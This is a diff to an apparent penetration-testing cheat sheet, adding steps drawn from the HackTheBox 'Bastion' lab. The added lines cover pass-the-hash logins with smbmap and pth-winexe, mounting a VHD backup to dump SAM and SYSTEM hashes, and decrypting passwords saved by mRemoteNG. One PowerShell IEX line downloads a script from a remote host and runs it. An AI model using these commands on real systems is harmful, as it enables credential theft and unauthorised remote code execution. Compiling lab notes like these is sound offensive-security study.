@@ -918,6 +918,7 @@ mget *     # Every time need to click yes, yes ..
 
 #SMBmap
 smbmap -H <target_ip>
+smbmap -u L4mpje -p aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9 -H 10.10.10.134 # Ippsec's HTB Bastion
 smbmap -H <target_ip> -u <username> -p <password>
 smbmap -H <target_ip> -u <username> -p <password> -d <domain>
 smbmap -H <target_ip> -u <username> -p <password> -r <share_name>
@@ -934,6 +935,18 @@ mask ""
 recurse ON
 prompt OFF
 mget *
+```
+## SMB to Mount
+- In the SMBCLIENT has the directory with .vhd file, using guestmount mounted to locally.
+- Reference IPPSEC HTB Bastion video
+```bash
+sudo apt-get install libguestfs-tools
+sudo apt-get install cifs-utils
+# 7z hash option to list the .vhd file
+7z l 9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd  # Found that windows/system32/confing so we can dump sam and system files
+mkdir /mnt/vhd
+sudo guestmount --add 9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd --inspector --ro -v /mnt/vhd
+#Check in the /mnt/vhd
 ```
 
 ## HTTP/S enumeration & Directory Buster
@@ -1908,7 +1921,7 @@ reg save hklm\sam c:\sam
 reg save hklm\system c:\system
 ```
 -Cracking the hashes 
-
+- If the hash seems to be like “31d6cfe0d16ae931b73c59d7e0c089c0” it means may be disabled accounts https://www.vanimpe.eu/2019/03/07/mimikatz-and-hashcat-in-practice/
 ```bash
 impacket-secretsdump -system SYSTEM -sam SAM local #always mention local in the command
 #Now a detailed list of hashes are displayed
@@ -1994,6 +2007,17 @@ runas /savecred /user:admin C:\Temp\reverse.exe
 ```bash
 #If hashes are obtained though some means then use psexec, smbexec and obtain the shell as different user.
 pth-winexe -U JEEVES/administrator%aad3b43XXXXXXXX35b51404ee:e0fb1fb857XXXXXXXX238cbe81fe00 //10.129.26.210 cmd.exe
+```
+### mRemoteNG - Windows PrivEsc
+- mRemoteNG is an open-source remote connections manager that allows users to view and manage multiple remote connections in a single place.
+- Check for Windows Program Files (x86), If any folder with mRomoteNG [Github](https://github.com/haseebT/mRemoteNG-Decrypt)
+- If want see the hidden directories in Windows C:\Users\L4mpje> dir /a
+- Reference HTB Bastion IPPSEC video
+  
+```powershell
+C:\Users\L4mpje\AppData\Roaming\mRemoteNG>type confCons.xml
+#All the passwords will save here, to decrypt use the above GitHub link to decrypt.
+python3 mremoteng_decrypt.py -s yhgmiu5bbuamU3qMUKc/uYDdmbMrJZ/JvR1kYe4Bhiu8bXybLxVnO0U9fKRylI7NcB9QuRsZVvla8esB
 ```
 
 ---
@@ -2279,6 +2303,13 @@ whoami
 </aside>
 
 ## Sensitive Information
+
+### Powershell run command
+- Run the PowerShell command
+```powershell
+IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.12/jaws-enum.ps1')
+```
+  
 
 ### Powershell History
 - I had a situation where in window AD, I got administrator access, but nothing to move forward to another machine, Then comes to the PowerShell history
